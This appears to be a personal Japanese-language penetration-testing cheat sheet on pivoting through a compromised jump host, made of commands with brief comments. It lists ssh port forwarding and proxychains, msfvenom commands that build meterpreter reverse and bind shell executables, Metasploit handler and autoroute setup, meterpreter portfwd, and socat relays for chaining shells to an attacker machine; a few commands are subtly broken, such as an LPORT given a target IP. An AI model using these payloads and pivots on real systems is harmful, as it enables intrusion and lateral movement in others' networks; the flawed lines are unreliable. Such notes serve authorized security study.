//ネットワークの調査
ipconfig
ip a
netstat -r

//port fwd
ssh -L <local port>:<local IP>:<remote port> <踏み台ユーザ>@<踏み台IP> #複数指定もできるよ

ssh -D <local port> <踏み台ユーザ>@<踏み台IP> #ダイナミックポートフォワード　9050番がデフォルトで使用できる。/etc/proxychains.confにsocks4 127.0.0.1 <port>を書き足す
proxychains <command> #ダイナミックポートフォワードしたあとにproxychain経由でコマンドを実行する

//chisel


//meterpreter
<踏み台を経由したmeterpreterセッションの確立の流れ>
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<踏み台IP> lport=<踏み台port> -f exe -o backupscript.exe　#ピボット先のホストで動かすexe
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https　#msfvenomに合わせたpayload
set lhost 0.0.0.0 #proxychain経由でピボットするときは0.0.0.0を指定
set lport 8000　#攻撃ホストでリッスンするポート
ssh -R <踏み台IP>:<踏み台IP>:0.0.0.0:8000 <踏み台ユーザ>@<target IP>
ピボット先ホストでexeを実行

<踏み台サーバとのmeterpreterセッションを利用してルーティング>
１台目のマシンとmeterpreterでセッションを確立したあとにbackgroundにして
route add <ピボット先のNWアドレス> <session ID>
use auxiliary/scanner/portscan/tcp #セッションを通じてスキャン
run autoroute -s <NW IP> #これでもルーティングできる。普通のターミナルからproxychainsを通じて通信できる

//meterpreter portfwd
meterpreter > portfwd add -l <local port> -p <remote port> -r <target IP> #ローカル

meterpreter > portfwd add -R -l 8080（kaliのポート）-p 1234（踏み台のポート） -L <kali IP> #リモート
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<踏み台のIP> LPORT=1234 -f exe -o reverseshell.exe #上記のmeterpreterのポートフォワードを利用して２本目のセッションを張るペイロード。IPとポートは踏み台のもの

//socat
<リバース>
socat TCP4-LISTEN:<踏み台ポート>,fork TCP4:<kali IP>:<kali port> #これは踏み台サーバで実行する。kaliはmulti/handlerで待ち受けて、最終ターゲットでexeを実行すればmeterpreterセッションが張れる
上記のためのペイロードをmsfvenomで作成する際は、lhostとlportは踏み台サーバのもの（ターゲットとつながっているeth）とする。multi/handlerの待ち受けはlhost=0.0.0.0,lport=<socatで指定したkali port>とする。

<バインド>
socat TCP4-LISTEN:<踏み台ポート>,fork TCP4:<target IP>:<target port> #踏み台サーバで実行。
multi/handlerのペイロードはbind_tcpを利用。set lportはsocatで指定した踏み台ポート。set rhostはkaliとつながっているethの踏み台IP。ターゲットでbindsehll.exeを実行すればセッションが張られる。
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o bindshell.exe LPORT=<target IP> #バインドexeのペイロード作成コマンド
